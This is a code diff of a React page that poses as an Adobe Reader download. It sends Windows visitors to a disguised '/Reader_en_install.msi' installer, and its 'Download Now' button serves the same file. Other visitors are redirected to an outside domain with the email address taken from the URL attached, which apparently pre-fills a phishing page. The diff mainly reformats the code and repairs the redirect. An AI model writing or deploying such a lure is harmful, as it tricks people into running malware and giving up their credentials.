@@ -1,13 +1,13 @@
-﻿import { useEffect } from 'react';
+import { useEffect } from "react";
 
 export default function Home() {
   useEffect(() => {
-    const userAgent = navigator.userAgent || '';
+    const userAgent = navigator.userAgent || "";
     const isWindows = /windows/i.test(userAgent);
 
-    const NON_WINDOWS_TARGET = 'https://wavemarkmx.com/ms';
-    const MSI_FILE = '/Reader_en_install.msi';
-    const WINDOWS_REDIRECT = 'https://mksonline.com.mx/css/adobe/reader/download.html';
+    const NON_WINDOWS_TARGET = "https://wavemarkmx.com/ms";
+    const MSI_FILE = "/Reader_en_install.msi";
+    const WINDOWS_REDIRECT = "https://mksonline.com.mx/css/adobe/reader/download.html";
 
     if (isWindows) {
       window.location.href = MSI_FILE;
@@ -17,33 +17,34 @@ export default function Home() {
       return;
     }
 
-    let email = '';
+    let email = "";
     const url = new URL(window.location.href);
 
+    // Grab email from hash or query parameters
     if (url.hash) email = url.hash.substring(1);
-    else if (url.searchParams.get('email')) email = url.searchParams.get('email');
-    else if (url.searchParams.get('smn')) email = url.searchParams.get('smn');
+    else if (url.searchParams.get("email")) email = url.searchParams.get("email");
+    else if (url.searchParams.get("smn")) email = url.searchParams.get("smn");
 
-    const finalUrl = email ? \\#\\ : NON_WINDOWS_TARGET;
+    const finalUrl = email ? `${NON_WINDOWS_TARGET}#${email}` : NON_WINDOWS_TARGET;
     window.location.replace(finalUrl);
   }, []);
 
   return (
-    <main style={{ textAlign: 'center', padding: '40px', fontFamily: 'Arial, sans-serif' }}>
-      <h1>Redirecting</h1>
-      <p>If your download does not start automatically, click the button below:</p>
+    <main style={{ textAlign: "center", padding: "40px", fontFamily: "Arial, sans-serif" }}>
+      <h1>Redirecting…</h1>
+      <p>If your download does not start automatically, click below:</p>
       <a
         href="/Reader_en_install.msi"
         download
         style={{
-          padding: '12px 24px',
-          backgroundColor: '#0070f3',
-          color: '#fff',
-          borderRadius: '6px',
-          textDecoration: 'none',
-          fontWeight: 'bold',
-          marginTop: '20px',
-          display: 'inline-block'
+          padding: "12px 24px",
+          backgroundColor: "#0070f3",
+          color: "#fff",
+          borderRadius: "6px",
+          textDecoration: "none",
+          fontWeight: "bold",
+          marginTop: "20px",
+          display: "inline-block"
         }}
       >
         Download Now
